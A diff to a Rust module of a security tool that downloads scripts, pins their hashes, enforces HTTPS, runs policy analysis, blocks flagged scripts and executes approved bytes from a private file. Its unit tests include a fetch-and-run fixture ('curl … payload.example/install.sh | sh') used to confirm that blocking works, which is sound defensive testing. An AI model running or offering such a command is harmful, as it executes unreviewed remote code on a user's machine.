@@ -2,15 +2,25 @@
 /// Downloads a script, analyzes it, optionally executes it with user confirmation.
 use std::fs;
 use std::io::{self, BufRead, Write};
+use std::path::Path;
 use std::process::Command;
 
 use sha2::{Digest, Sha256};
 
 use crate::receipt::Receipt;
 use crate::script_analysis;
+use crate::verdict::{Action, Verdict};
 
 pub struct RunResult {
     pub receipt: Receipt,
+    /// Redacted policy-complete body verdict. `None` only for a deliberately
+    /// non-executing inspection whose bytes/interpreter could not be analyzed
+    /// completely. The unredacted/raw rule IDs remain confined to the audit path.
+    pub verdict: Option<Verdict>,
+    pub analysis_complete: bool,
+    /// True when complete analysis refused execution (distinct from `--no-exec`
+    /// or a user-cancelled prompt). Carries the blocking verdict to JSON callers.
+    pub refused: bool,
     pub executed: bool,
     pub exit_code: Option<i32>,
 }
@@ -21,10 +31,10 @@ pub struct RunResult {
 /// inside the OS containment capsule without `tirith-core` depending on the
 /// capsule launcher (which is async/OS-API-bound and lives in the CLI crate).
 ///
-/// Given the resolved `interpreter` and the cached script `path`, it runs the
-/// script and returns its exit code. When `None`, the runner uses its built-in
-/// uncontained `Command::new(interpreter).arg(path)` execution (the historical
-/// behavior).
+/// Given the resolved `interpreter` and the private, hash-verified execution-file
+/// `path`, it runs the script and returns its exit code. The content-addressed
+/// cache is never passed to an executor. When `None`, the runner uses its built-in
+/// uncontained `Command::new(interpreter).arg(path)` execution.
 pub type ScriptExecutor = Box<dyn Fn(&str, &std::path::Path) -> Result<i32, String>>;
 
 pub struct RunOptions {
@@ -35,6 +45,46 @@ pub struct RunOptions {
     /// Optional contained executor for the run step (E5). `None` keeps the
     /// built-in uncontained execution.
     pub exec_fn: Option<ScriptExecutor>,
+}
+
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+enum DownloadPurpose {
+    Execute,
+    SaveOnly,
+}
+
+#[derive(Debug)]
+struct ValidatedDownloadRequest {
+    url: url::Url,
+    expected_sha256: Option<String>,
+}
+
+struct DownloadedBytes {
+    content: Vec<u8>,
+    sha256: String,
+    final_url: String,
+    redirects: Vec<String>,
+}
+
+struct ScriptReview {
+    interpreter: String,
+    legacy: script_analysis::ScriptAnalysis,
+    analysis_complete: bool,
+    incomplete_reason: Option<&'static str>,
+    raw_verdict: Option<Verdict>,
+    effective_verdict: Option<Verdict>,
+    policy: Option<crate::policy::Policy>,
+}
+
+struct ExecutionFile {
+    _private_dir: tempfile::TempDir,
+    file: tempfile::NamedTempFile,
+}
+
+impl ExecutionFile {
+    fn path(&self) -> &Path {
+        self.file.path()
+    }
 }
 
 /// Interpreters matched by exact name only.
@@ -76,17 +126,92 @@ fn is_valid_version_suffix(s: &str) -> bool {
         .all(|part| !part.is_empty() && part.chars().all(|c| c.is_ascii_digit()))
 }
 
-pub fn run(opts: RunOptions) -> Result<RunResult, String> {
-    if !opts.no_exec && !opts.interactive {
-        return Err("tirith run requires an interactive terminal or --no-exec flag".to_string());
+fn normalize_sha256_pin(expected: Option<&str>) -> Result<Option<String>, String> {
+    let Some(expected) = expected else {
+        return Ok(None);
+    };
+    if expected.len() != 64 || !expected.bytes().all(|b| b.is_ascii_hexdigit()) {
+        return Err(format!(
+            "invalid SHA-256 pin: expected exactly 64 hexadecimal characters, got '{}'",
+            crate::util::truncate_bytes(expected, 16)
+        ));
     }
+    Ok(Some(expected.to_ascii_lowercase()))
+}
 
-    // F6: validate the first hop up front so an SSRF target gives a fast, clear
-    // error instead of a connect failure. The connect-time DNS guard below is
-    // the rebinding backstop; this is the pre-flight check.
-    crate::url_validate::validate_fetch_url(&opts.url)?;
+/// Validate all caller-controlled request inputs before constructing a client or
+/// resolving a hostname. Execution requires authenticated transport: HTTPS, or
+/// the narrow compatibility case of a directly requested HTTP URL with a valid
+/// digest pin. Save-only downloads retain their historical HTTP support.
+fn validate_download_request(
+    url: &str,
+    expected_sha256: Option<&str>,
+    purpose: DownloadPurpose,
+) -> Result<ValidatedDownloadRequest, String> {
+    // The pin is intentionally first: malformed integrity metadata must fail
+    // before DNS, socket, proxy, or other network-visible work.
+    let expected_sha256 = normalize_sha256_pin(expected_sha256)?;
+    let parsed = url::Url::parse(url).map_err(|e| format!("invalid URL: {e}"))?;
+    validate_initial_transport(&parsed, expected_sha256.is_some(), purpose)?;
+    crate::url_validate::validate_fetch_url(parsed.as_str())?;
+    Ok(ValidatedDownloadRequest {
+        url: parsed,
+        expected_sha256,
+    })
+}
 
-    let mut redirects: Vec<String> = Vec::new();
+fn validate_initial_transport(
+    parsed: &url::Url,
+    has_sha256_pin: bool,
+    purpose: DownloadPurpose,
+) -> Result<(), String> {
+    if purpose == DownloadPurpose::Execute && parsed.scheme() == "http" && !has_sha256_pin {
+        return Err(
+            "executable downloads require HTTPS; direct HTTP is allowed only with an explicit SHA-256 pin"
+                .to_string(),
+        );
+    }
+    Ok(())
+}
+
+fn validate_redirect_target(
+    previous: &url::Url,
+    target: &url::Url,
+    purpose: DownloadPurpose,
+) -> Result<(), String> {
+    // No redirect hop in an executable transaction may use cleartext. This is
+    // stricter than the direct-HTTP compatibility exception because a pin does
+    // not justify silently changing the requested transport path.
+    if purpose == DownloadPurpose::Execute && target.scheme() != "https" {
+        return Err(format!(
+            "executable redirect must use HTTPS ({} -> {})",
+            previous.scheme(),
+            target.scheme()
+        ));
+    }
+    crate::url_validate::validate_fetch_url(target.as_str()).map(|_| ())
+}
+
+fn require_success_status(status: reqwest::StatusCode) -> Result<(), String> {
+    if status.is_success() {
+        Ok(())
+    } else {
+        Err(format!("download failed with HTTP status {status}"))
+    }
+}
+
+fn sha256_hex(content: &[u8]) -> String {
+    let mut hasher = Sha256::new();
+    hasher.update(content);
+    format!("{:x}", hasher.finalize())
+}
+
+fn download_bounded(
+    url: &str,
+    expected_sha256: Option<&str>,
+    purpose: DownloadPurpose,
+) -> Result<DownloadedBytes, String> {
+    let request = validate_download_request(url, expected_sha256, purpose)?;
     let redirect_list = std::sync::Arc::new(std::sync::Mutex::new(Vec::new()));
     let redirect_list_clone = redirect_list.clone();
 
@@ -96,18 +221,13 @@ pub fn run(opts: RunOptions) -> Result<RunResult, String> {
             if let Ok(mut list) = redirect_list_clone.lock() {
                 list.push(attempt.url().to_string());
             }
-            // Guard redirect *targets* against SSRF (the user-chosen initial URL
-            // is intentional and not re-validated here). Fail with `error`, not
-            // `stop` — `stop` would surface the 3xx as a success and let its
-            // body be processed as the download.
             if attempt.previous().len() >= 10 {
-                attempt.error("too many redirects")
-            } else if let Err(reason) =
-                crate::url_validate::validate_fetch_url(attempt.url().as_str())
-            {
-                attempt.error(reason)
-            } else {
-                attempt.follow()
+                return attempt.error("too many redirects");
+            }
+            let previous = attempt.previous().last().unwrap_or(attempt.url());
+            match validate_redirect_target(previous, attempt.url(), purpose) {
+                Ok(()) => attempt.follow(),
+                Err(reason) => attempt.error(reason),
             }
         }))
         .timeout(std::time::Duration::from_secs(30))
@@ -115,18 +235,13 @@ pub fn run(opts: RunOptions) -> Result<RunResult, String> {
         .map_err(|e| format!("http client: {e}"))?;
 
     let response = client
-        .get(&opts.url)
+        .get(request.url)
         .send()
         .map_err(|e| format!("download failed: {e}"))?;
-
+    require_success_status(response.status())?;
     let final_url = response.url().to_string();
-    if let Ok(list) = redirect_list.lock() {
-        redirects = list.clone();
-    }
 
-    const MAX_BODY: u64 = 10 * 1024 * 1024; // 10 MiB
-
-    // Fast-reject via Content-Length before we pay to read the body.
+    const MAX_BODY: u64 = 10 * 1024 * 1024;
     if let Some(len) = response.content_length() {
         if len > MAX_BODY {
             return Err(format!(
@@ -136,32 +251,295 @@ pub fn run(opts: RunOptions) -> Result<RunResult, String> {
         }
     }
 
-    use std::io::Read;
-    let mut buf = Vec::new();
+    use std::io::Read as _;
+    let mut content = Vec::new();
     response
         .take(MAX_BODY + 1)
-        .read_to_end(&mut buf)
+        .read_to_end(&mut content)
         .map_err(|e| format!("read body: {e}"))?;
-    if buf.len() as u64 > MAX_BODY {
+    if content.len() as u64 > MAX_BODY {
         return Err(format!(
             "response body exceeds {} MiB limit",
             MAX_BODY / 1024 / 1024
         ));
     }
-    let content = buf;
 
-    let mut hasher = Sha256::new();
-    hasher.update(&content);
-    let sha256 = format!("{:x}", hasher.finalize());
-
-    if let Some(ref expected) = opts.expected_sha256 {
-        let expected_lower = expected.to_lowercase();
-        if sha256 != expected_lower {
+    let sha256 = sha256_hex(&content);
+    if let Some(expected) = request.expected_sha256 {
+        if sha256 != expected {
             return Err(format!(
-                "SHA-256 mismatch: expected {expected_lower}, got {sha256}"
+                "SHA-256 mismatch: expected {expected}, got {sha256}"
             ));
         }
     }
+    let redirects = redirect_list
+        .lock()
+        .map(|list| list.clone())
+        .unwrap_or_default();
+    Ok(DownloadedBytes {
+        content,
+        sha256,
+        final_url,
+        redirects,
+    })
+}
+
+fn interpreter_analysis(
+    interpreter: &str,
+) -> Option<(crate::tokenize::ShellType, bool, &'static str)> {
+    let base = interpreter.rsplit('/').next().unwrap_or(interpreter);
+    if matches!(base, "sh" | "bash" | "zsh" | "dash" | "ksh") {
+        return Some((crate::tokenize::ShellType::Posix, true, "sh"));
+    }
+    if base == "fish" {
+        return Some((crate::tokenize::ShellType::Fish, true, "fish"));
+    }
+    for (family, extension) in [
+        ("python", "py"),
+        ("ruby", "rb"),
+        ("perl", "pl"),
+        ("node", "js"),
+    ] {
+        if base == family
+            || base
+                .strip_prefix(family)
+                .is_some_and(is_valid_version_suffix)
+        {
+            return Some((crate::tokenize::ShellType::Posix, false, extension));
+        }
+    }
+    if matches!(base, "nodejs" | "deno" | "bun") {
+        return Some((crate::tokenize::ShellType::Posix, false, "js"));
+    }
+    None
+}
+
+fn review_script_bytes(
+    content: &[u8],
+    will_execute: bool,
+    interactive: bool,
+    cwd: Option<&Path>,
+) -> Result<ScriptReview, String> {
+    let content_str = match std::str::from_utf8(content) {
+        Ok(text) => text.to_string(),
+        Err(_) if will_execute => {
+            return Err("refusing execution: downloaded script is not valid UTF-8".to_string())
+        }
+        Err(_) => {
+            let lossy = String::from_utf8_lossy(content).into_owned();
+            let interpreter = script_analysis::detect_interpreter(&lossy).to_string();
+            return Ok(ScriptReview {
+                legacy: script_analysis::analyze(&lossy, &interpreter),
+                interpreter,
+                analysis_complete: false,
+                incomplete_reason: Some("invalid-utf8"),
+                raw_verdict: None,
+                effective_verdict: None,
+                policy: None,
+            });
+        }
+    };
+    let interpreter = script_analysis::detect_interpreter(&content_str).to_string();
+    let Some((shell, command_semantics, extension)) = interpreter_analysis(&interpreter) else {
+        if will_execute {
+            return Err(format!(
+                "refusing execution: interpreter '{interpreter}' has no complete analyzer"
+            ));
+        }
+        return Ok(ScriptReview {
+            legacy: script_analysis::analyze(&content_str, &interpreter),
+            interpreter,
+            analysis_complete: false,
+            incomplete_reason: Some("unsupported-interpreter"),
+            raw_verdict: None,
+            effective_verdict: None,
+            policy: None,
+        });
+    };
+
+    let cwd_string = cwd.map(|path| path.display().to_string());
+    let logical_path = cwd
+        .unwrap_or_else(|| Path::new("."))
+        .join(format!("downloaded-script.{extension}"));
+    let ctx = crate::engine::AnalysisContext {
+        input: content_str.clone(),
+        shell,
+        scan_context: if command_semantics {
+            crate::extract::ScanContext::Exec
+        } else {
+            crate::extract::ScanContext::FileScan
+        },
+        raw_bytes: Some(content.to_vec()),
+        interactive,
+        cwd: cwd_string,
+        file_path: (!command_semantics).then_some(logical_path.clone()),
+        repo_root: None,
+        is_config_override: false,
+        clipboard_html: None,
+        card_ref: None,
+        clipboard_source: crate::clipboard::ClipboardSourceState::Unread,
+    };
+    let analyzed = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
+        crate::engine::analyze_without_bypass_returning_policy(&ctx)
+    }))
+    .map_err(|_| "refusing execution: policy analysis did not complete".to_string())?;
+    let (mut raw_verdict, policy) = analyzed;
+
+    // Shell source is both an executable command stream and a code file. The
+    // Exec pipeline supplies command/policy rules; add the repository's code-file
+    // rules over the same UTF-8 bytes without reopening any path.
+    if command_semantics {
+        raw_verdict.findings.extend(crate::rules::codefile::check(
+            &content_str,
+            logical_path.to_str(),
+        ));
+        raw_verdict.action = crate::verdict::upgraded_action_from_findings(
+            &raw_verdict.findings,
+            raw_verdict.action,
+        );
+    }
+    raw_verdict.agent_origin = Some(crate::agent_origin::resolve_cli_origin(interactive));
+    let session_id = crate::session::resolve_session_id();
+    let effective_verdict = crate::escalation::post_process_verdict(
+        &raw_verdict,
+        &policy,
+        &content_str,
+        &session_id,
+        crate::escalation::CallerContext::Cli,
+    );
+    Ok(ScriptReview {
+        legacy: script_analysis::analyze(&content_str, &interpreter),
+        interpreter,
+        analysis_complete: true,
+        incomplete_reason: None,
+        raw_verdict: Some(raw_verdict),
+        effective_verdict: Some(effective_verdict),
+        policy: Some(policy),
+    })
+}
+
+fn apply_explicit_bypass(
+    review: &mut ScriptReview,
+    policy: &crate::policy::Policy,
+    requested: bool,
+    interactive: bool,
+) -> bool {
+    let allowed = requested
+        && if interactive {
+            policy.allow_bypass_env
+        } else {
+            policy.allow_bypass_env_noninteractive
+        };
+    for verdict in [
+        review.raw_verdict.as_mut(),
+        review.effective_verdict.as_mut(),
+    ]
+    .into_iter()
+    .flatten()
+    {
+        verdict.bypass_requested = requested;
+        verdict.bypass_available = if interactive {
+            policy.allow_bypass_env
+        } else {
+            policy.allow_bypass_env_noninteractive
+        };
+        verdict.bypass_honored = allowed;
+    }
+    allowed
+}
+
+fn raw_audit_fields(review: &ScriptReview) -> Option<(String, Vec<String>)> {
+    review.raw_verdict.as_ref().map(|raw| {
+        (
+            format!("{:?}", raw.action),
+            raw.findings
+                .iter()
+                .map(|finding| finding.rule_id.to_string())
+                .collect(),
+        )
+    })
+}
+
+fn redacted_result_verdict(review: &ScriptReview) -> Option<Verdict> {
+    review.effective_verdict.as_ref().map(|effective| {
+        let mut display = effective.clone();
+        let custom_patterns = review
+            .policy
+            .as_ref()
+            .map(|policy| policy.dlp_custom_patterns.as_slice())
+            .unwrap_or(&[]);
+        display.findings = crate::redact::redacted_findings(&display.findings, custom_patterns);
+        display
+    })
+}
+
+fn materialize_execution_file(
+    parent: &Path,
+    content: &[u8],
+    expected_sha256: &str,
+) -> Result<ExecutionFile, String> {
+    let private_dir = tempfile::Builder::new()
+        .prefix(".tirith-run-")
+        .tempdir_in(parent)
+        .map_err(|e| format!("create private execution directory: {e}"))?;
+    #[cfg(unix)]
+    {
+        use std::os::unix::fs::PermissionsExt as _;
+        fs::set_permissions(private_dir.path(), fs::Permissions::from_mode(0o700))
+            .map_err(|e| format!("secure execution directory: {e}"))?;
+    }
+    let mut file = tempfile::NamedTempFile::new_in(private_dir.path())
+        .map_err(|e| format!("create private execution file: {e}"))?;
+    #[cfg(unix)]
+    {
+        use std::os::unix::fs::PermissionsExt as _;
+        file.as_file()
+            .set_permissions(fs::Permissions::from_mode(0o600))
+            .map_err(|e| format!("secure execution file: {e}"))?;
+    }
+    file.write_all(content)
+        .map_err(|e| format!("write execution file: {e}"))?;
+    file.as_file()
+        .sync_all()
+        .map_err(|e| format!("sync execution file: {e}"))?;
+    // Verify through the still-open file description, never by reopening the
+    // pathname. A directory-entry replacement cannot influence this digest.
+    let mut verifier = file
+        .as_file()
+        .try_clone()
+        .map_err(|e| format!("clone execution file handle: {e}"))?;
+    {
+        use std::io::{Read as _, Seek as _};
+        verifier
+            .seek(std::io::SeekFrom::Start(0))
+            .map_err(|e| format!("rewind execution file: {e}"))?;
+        let mut written = Vec::with_capacity(content.len());
+        verifier
+            .take(content.len() as u64 + 1)
+            .read_to_end(&mut written)
+            .map_err(|e| format!("verify execution file: {e}"))?;
+        if written.len() != content.len() || sha256_hex(&written) != expected_sha256 {
+            return Err("execution file digest changed before spawn".to_string());
+        }
+    }
+    Ok(ExecutionFile {
+        _private_dir: private_dir,
+        file,
+    })
+}
+
+pub fn run(opts: RunOptions) -> Result<RunResult, String> {
+    if !opts.no_exec && !opts.interactive {
+        return Err("tirith run requires an interactive terminal or --no-exec flag".to_string());
+    }
+    let purpose = if opts.no_exec {
+        DownloadPurpose::SaveOnly
+    } else {
+        DownloadPurpose::Execute
+    };
+    let downloaded = download_bounded(&opts.url, opts.expected_sha256.as_deref(), purpose)?;
+    let content = downloaded.content;
+    let sha256 = downloaded.sha256;
 
     let cache_dir = crate::policy::data_dir()
         .ok_or("cannot determine data directory")?
@@ -194,54 +572,103 @@ pub fn run(opts: RunOptions) -> Result<RunResult, String> {
         crate::util::fsync_parent_dir_logged(&cached_path, "run cache");
     }
 
-    let content_str = match String::from_utf8(content.clone()) {
-        Ok(s) => s,
-        Err(_) => {
-            eprintln!("tirith: warning: downloaded content contains invalid UTF-8, using lossy conversion");
-            String::from_utf8_lossy(&content).into_owned()
-        }
-    };
-
-    let interpreter = script_analysis::detect_interpreter(&content_str);
-    let analysis = script_analysis::analyze(&content_str, interpreter);
-
-    // Allowlist is only enforced when we might execute (--no-exec is inspect-only).
-    if !opts.no_exec && !is_allowed_interpreter(interpreter) {
+    let cwd = std::env::current_dir().ok();
+    let mut review =
+        review_script_bytes(&content, !opts.no_exec, opts.interactive, cwd.as_deref())?;
+    // Keep the legacy allowlist as a second, explicit execution gate. The
+    // analyzer table is intentionally no broader than this list, but both must
+    // agree before an interpreter is invoked.
+    if !opts.no_exec && !is_allowed_interpreter(&review.interpreter) {
         return Err(format!(
-            "interpreter '{interpreter}' is not in the allowed list",
+            "interpreter '{}' is not in the allowed list",
+            review.interpreter
         ));
     }
+
+    let bypass_requested = std::env::var("TIRITH").ok().as_deref() == Some("0");
+    let bypass_honored = if let Some(policy) = review.policy.clone() {
+        apply_explicit_bypass(&mut review, &policy, bypass_requested, opts.interactive)
+    } else {
+        false
+    };
 
     let (git_repo, git_branch) = detect_git_info();
 
     let receipt = Receipt {
         url: opts.url.clone(),
-        final_url: Some(final_url),
-        redirects,
+        final_url: Some(downloaded.final_url),
+        redirects: downloaded.redirects,
         sha256: sha256.clone(),
         size: content.len() as u64,
-        domains_referenced: analysis.domains_referenced,
-        paths_referenced: analysis.paths_referenced,
-        analysis_method: "static".to_string(),
-        privilege: if analysis.has_sudo {
+        domains_referenced: review.legacy.domains_referenced.clone(),
+        paths_referenced: review.legacy.paths_referenced.clone(),
+        analysis_method: if review.analysis_complete {
+            format!("policy-complete:{}", review.interpreter)
+        } else {
+            format!(
+                "static-incomplete:{}",
+                review.incomplete_reason.unwrap_or("unknown")
+            )
+        },
+        privilege: if review.legacy.has_sudo {
             "elevated".to_string()
         } else {
             "normal".to_string()
         },
         timestamp: chrono::Utc::now().to_rfc3339(),
-        cwd: std::env::current_dir()
-            .ok()
-            .map(|p| p.display().to_string()),
+        cwd: cwd.as_ref().map(|p| p.display().to_string()),
         git_repo,
         git_branch,
     };
+
+    if let (Some(_), Some(effective), Some(policy)) = (
+        review.raw_verdict.as_ref(),
+        review.effective_verdict.as_ref(),
+        review.policy.as_ref(),
+    ) {
+        let (raw_action, raw_rule_ids) = raw_audit_fields(&review)
+            .expect("raw verdict is present when the complete effective verdict is present");
+        let audit_subject = format!("downloaded-script sha256:{sha256}");
+        let _ = crate::audit::log_verdict_with_raw(
+            effective,
+            &audit_subject,
+            None,
+            Some(uuid::Uuid::new_v4().to_string()),
+            &policy.dlp_custom_patterns,
+            Some(raw_action),
+            Some(raw_rule_ids),
+        );
+    }
+    let result_verdict = redacted_result_verdict(&review);
+    if let Some(display) = result_verdict.as_ref() {
+        let _ = crate::output::write_human(display, false, std::io::stderr().lock());
+    }
 
     if opts.no_exec {
         receipt.save().map_err(|e| format!("save receipt: {e}"))?;
         return Ok(RunResult {
             receipt,
+            verdict: result_verdict,
+            analysis_complete: review.analysis_complete,
+            refused: false,
             executed: false,
             exit_code: None,
+        });
+    }
+
+    let blocked = review
+        .effective_verdict
+        .as_ref()
+        .is_some_and(|verdict| verdict.action == Action::Block);
+    if blocked && !bypass_honored {
+        receipt.save().map_err(|e| format!("save receipt: {e}"))?;
+        return Ok(RunResult {
+            receipt,
+            verdict: result_verdict,
+            analysis_complete: review.analysis_complete,
+            refused: true,
+            executed: false,
+            exit_code: Some(Action::Block.exit_code()),
         });
     }
 
@@ -250,15 +677,11 @@ pub fn run(opts: RunOptions) -> Result<RunResult, String> {
         content.len(),
         crate::receipt::short_hash(&sha256)
     );
-    eprintln!("tirith: interpreter: {interpreter}");
-    if analysis.has_sudo {
-        eprintln!("tirith: WARNING: script uses sudo");
-    }
-    if analysis.has_eval {
-        eprintln!("tirith: WARNING: script uses eval");
-    }
-    if analysis.has_base64 {
-        eprintln!("tirith: WARNING: script uses base64");
+    eprintln!("tirith: interpreter: {}", review.interpreter);
+    if bypass_honored {
+        eprintln!(
+            "tirith: blocking body verdict explicitly bypassed via TIRITH=0 (audited with raw findings)"
+        );
     }
 
     let tty = fs::OpenOptions::new()
@@ -282,6 +705,9 @@ pub fn run(opts: RunOptions) -> Result<RunResult, String> {
         receipt.save().map_err(|e| format!("save receipt: {e}"))?;
         return Ok(RunResult {
             receipt,
+            verdict: result_verdict,
+            analysis_complete: review.analysis_complete,
+            refused: false,
             executed: false,
             exit_code: None,
         });
@@ -289,14 +715,16 @@ pub fn run(opts: RunOptions) -> Result<RunResult, String> {
 
     receipt.save().map_err(|e| format!("save receipt: {e}"))?;
 
-    // E5: when the caller supplied a contained executor, run the script through it
-    // (the CLI crate routes this to the OS capsule). Otherwise run uncontained, as
-    // before. The executor returns the child's exit code directly.
+    // Never execute the stable content-addressed cache path. Materialize the
+    // reviewed in-memory bytes into a fresh 0700 directory / 0600 file, keep its
+    // handle alive across execution, and verify its digest before the executor
+    // sees the path. A cache replacement therefore cannot change executed bytes.
+    let execution = materialize_execution_file(&cache_dir, &content, &sha256)?;
     let exit_code = if let Some(exec) = opts.exec_fn.as_ref() {
-        Some(exec(interpreter, &cached_path)?)
+        Some(exec(&review.interpreter, execution.path())?)
     } else {
-        let status = Command::new(interpreter)
-            .arg(&cached_path)
+        let status = Command::new(&review.interpreter)
+            .arg(execution.path())
             .status()
             .map_err(|e| format!("execute: {e}"))?;
         status.code()
@@ -304,6 +732,9 @@ pub fn run(opts: RunOptions) -> Result<RunResult, String> {
 
     Ok(RunResult {
         receipt,
+        verdict: result_verdict,
+        analysis_complete: review.analysis_complete,
+        refused: false,
         executed: true,
         exit_code,
     })
@@ -332,81 +763,9 @@ pub fn download_to_path(
     dest: &std::path::Path,
     expected_sha256: Option<&str>,
 ) -> Result<DownloadResult, String> {
-    // F6: validate the first hop up front (see `run()` — same pre-flight check;
-    // the connect-time DNS guard below is the rebinding backstop).
-    crate::url_validate::validate_fetch_url(url)?;
-
-    let redirect_list = std::sync::Arc::new(std::sync::Mutex::new(Vec::new()));
-    let redirect_list_clone = redirect_list.clone();
-
-    let client = reqwest::blocking::Client::builder()
-        .dns_resolver(crate::ssrf_guard::fetch_resolver())
-        .redirect(reqwest::redirect::Policy::custom(move |attempt| {
-            if let Ok(mut list) = redirect_list_clone.lock() {
-                list.push(attempt.url().to_string());
-            }
-            // Guard redirect *targets* against SSRF (the user-chosen initial URL
-            // is intentional and not re-validated here). Fail with `error`, not
-            // `stop` — `stop` would surface the 3xx as a success and let its
-            // body be processed as the download.
-            if attempt.previous().len() >= 10 {
-                attempt.error("too many redirects")
-            } else if let Err(reason) =
-                crate::url_validate::validate_fetch_url(attempt.url().as_str())
-            {
-                attempt.error(reason)
-            } else {
-                attempt.follow()
-            }
-        }))
-        .timeout(std::time::Duration::from_secs(30))
-        .build()
-        .map_err(|e| format!("http client: {e}"))?;
-
-    let response = client
-        .get(url)
-        .send()
-        .map_err(|e| format!("download failed: {e}"))?;
-
-    let final_url = response.url().to_string();
-
-    const MAX_BODY: u64 = 10 * 1024 * 1024; // 10 MiB
-
-    if let Some(len) = response.content_length() {
-        if len > MAX_BODY {
-            return Err(format!(
-                "response too large: {len} bytes (max {} MiB)",
-                MAX_BODY / 1024 / 1024
-            ));
-        }
-    }
-
-    use std::io::Read;
-    let mut buf = Vec::new();
-    response
-        .take(MAX_BODY + 1)
-        .read_to_end(&mut buf)
-        .map_err(|e| format!("read body: {e}"))?;
-    if buf.len() as u64 > MAX_BODY {
-        return Err(format!(
-            "response body exceeds {} MiB limit",
-            MAX_BODY / 1024 / 1024
-        ));
-    }
-    let content = buf;
-
-    let mut hasher = Sha256::new();
-    hasher.update(&content);
-    let sha256 = format!("{:x}", hasher.finalize());
-
-    if let Some(expected) = expected_sha256 {
-        let expected_lower = expected.to_lowercase();
-        if sha256 != expected_lower {
-            return Err(format!(
-                "SHA-256 mismatch: expected {expected_lower}, got {sha256}"
-            ));
-        }
-    }
+    let downloaded = download_bounded(url, expected_sha256, DownloadPurpose::SaveOnly)?;
+    let content = downloaded.content;
+    let sha256 = downloaded.sha256;
 
     // Atomic write: sibling temp + rename, 0600.
     let dir = dest.parent().filter(|p| !p.as_os_str().is_empty());
@@ -443,7 +802,7 @@ pub fn download_to_path(
     Ok(DownloadResult {
         path: dest.to_path_buf(),
         sha256,
-        final_url,
+        final_url: downloaded.final_url,
         size: content.len() as u64,
         interpreter,
     })
@@ -473,6 +832,174 @@ fn detect_git_info() -> (Option<String>, Option<String>) {
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    #[test]
+    fn execution_transport_rejects_http_without_pin() {
+        let err = validate_download_request(
+            "http://downloads.example/install.sh",
+            None,
+            DownloadPurpose::Execute,
+        )
+        .expect_err("unpinned HTTP executable download must fail");
+        assert!(err.contains("HTTPS"));
+    }
+
+    #[test]
+    fn execution_transport_allows_direct_http_with_valid_compatibility_pin() {
+        let parsed = url::Url::parse("http://downloads.example/install.sh").unwrap();
+        validate_initial_transport(&parsed, true, DownloadPurpose::Execute)
+            .expect("a valid digest pin authenticates a direct HTTP compatibility download");
+    }
+
+    #[test]
+    fn execution_transport_rejects_https_downgrade_even_with_pin() {
+        let previous = url::Url::parse("https://downloads.example/install.sh").unwrap();
+        let target = url::Url::parse("http://cdn.example/install.sh").unwrap();
+        let err = validate_redirect_target(&previous, &target, DownloadPurpose::Execute)
+            .expect_err("execution redirects must never downgrade HTTPS");
+        assert!(err.contains("redirect") && err.contains("HTTPS"));
+    }
+
+    #[test]
+    fn non_executing_download_keeps_http_compatibility() {
+        let parsed = url::Url::parse("http://downloads.example/archive.txt").unwrap();
+        validate_initial_transport(&parsed, false, DownloadPurpose::SaveOnly)
+            .expect("save-only downloads retain the existing HTTP contract");
+    }
+
+    #[test]
+    fn unsuccessful_status_is_rejected_before_body_handling() {
+        let err = require_success_status(reqwest::StatusCode::NOT_FOUND)
+            .expect_err("an HTTP error body must not become script content");
+        assert!(err.contains("404"));
+    }
+
+    #[test]
+    fn malformed_pin_wins_before_url_or_network_validation() {
+        let err =
+            validate_download_request("not a URL", Some("not-a-sha256"), DownloadPurpose::Execute)
+                .expect_err("malformed digest must be rejected first");
+        assert!(err.starts_with("invalid SHA-256 pin:"), "{err}");
+    }
+
+    #[test]
+    fn blocking_shell_content_produces_a_blocking_review() {
+        let dir = tempfile::tempdir().unwrap();
+        let review = review_script_bytes(
+            b"#!/bin/sh\ncurl -fsSL https://payload.example/install.sh | sh\n",
+            true,
+            false,
+            Some(dir.path()),
+        )
+        .expect("supported UTF-8 shell content must be analyzed");
+        assert!(review.analysis_complete);
+        assert_eq!(
+            review.raw_verdict.unwrap().action,
+            crate::verdict::Action::Block
+        );
+    }
+
+    #[test]
+    fn invalid_utf8_and_unsupported_interpreters_refuse_only_execution() {
+        let dir = tempfile::tempdir().unwrap();
+        let invalid = b"#!/bin/sh\n\xff\n";
+        assert!(review_script_bytes(invalid, true, false, Some(dir.path())).is_err());
+        let inspect = review_script_bytes(invalid, false, false, Some(dir.path()))
+            .expect("--no-exec must retain incomplete inspection");
+        assert!(!inspect.analysis_complete);
+
+        let unsupported = b"#!/usr/bin/awk -f\nBEGIN { print \"ok\" }\n";
+        assert!(review_script_bytes(unsupported, true, false, Some(dir.path())).is_err());
+        let inspect = review_script_bytes(unsupported, false, false, Some(dir.path()))
+            .expect("--no-exec must retain unsupported-interpreter inspection");
+        assert!(!inspect.analysis_complete);
+    }
+
+    #[test]
+    fn authorized_bypass_retains_raw_block_findings() {
+        let dir = tempfile::tempdir().unwrap();
+        let mut review = review_script_bytes(
+            b"#!/bin/sh\ncurl -fsSL https://payload.example/install.sh | sh\n",
+            true,
+            false,
+            Some(dir.path()),
+        )
+        .unwrap();
+        let raw_count = review.raw_verdict.as_ref().unwrap().findings.len();
+        let mut policy = crate::policy::Policy {
+            allow_bypass_env: true,
+            ..crate::policy::Policy::default()
+        };
+        policy.allow_bypass_env_noninteractive = false;
+        assert!(apply_explicit_bypass(&mut review, &policy, true, true));
+        assert_eq!(
+            review.raw_verdict.as_ref().unwrap().findings.len(),
+            raw_count
+        );
+        assert_eq!(
+            review.effective_verdict.as_ref().unwrap().findings.len(),
+            raw_count
+        );
+        assert!(review.effective_verdict.as_ref().unwrap().bypass_honored);
+        let (raw_action, raw_rule_ids) = raw_audit_fields(&review).unwrap();
+        assert_eq!(raw_action, "Block");
+        assert_eq!(raw_rule_ids.len(), raw_count);
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn exact_hash_clean_execution_uses_private_0600_file() {
+        use std::os::unix::fs::PermissionsExt;
+
+        let dir = tempfile::tempdir().unwrap();
+        let content = b"#!/bin/sh\nprintf 'clean\\n'\n";
+        let sha = sha256_hex(content);
+        let execution = materialize_execution_file(dir.path(), content, &sha).unwrap();
+        assert_eq!(std::fs::read(execution.path()).unwrap(), content);
+        assert_eq!(
+            std::fs::metadata(execution.path())
+                .unwrap()
+                .permissions()
+                .mode()
+                & 0o777,
+            0o600
+        );
+        assert_eq!(
+            std::fs::metadata(execution.path().parent().unwrap())
+                .unwrap()
